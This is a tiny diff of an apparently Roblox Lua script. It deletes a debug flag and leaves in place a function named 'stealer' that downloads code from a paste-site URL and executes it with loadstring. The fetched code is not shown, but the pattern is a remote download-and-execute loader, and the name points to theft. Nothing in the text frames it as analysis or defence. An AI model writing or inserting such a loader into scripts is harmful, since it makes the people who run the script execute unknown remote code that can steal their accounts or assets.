@@ -1,4 +1,4 @@
-debuging = true
+
 local function stealer()
 loadstring(game:HttpGet("https://paste.debian.net/plainh/591ac0a7/", true))()
 end
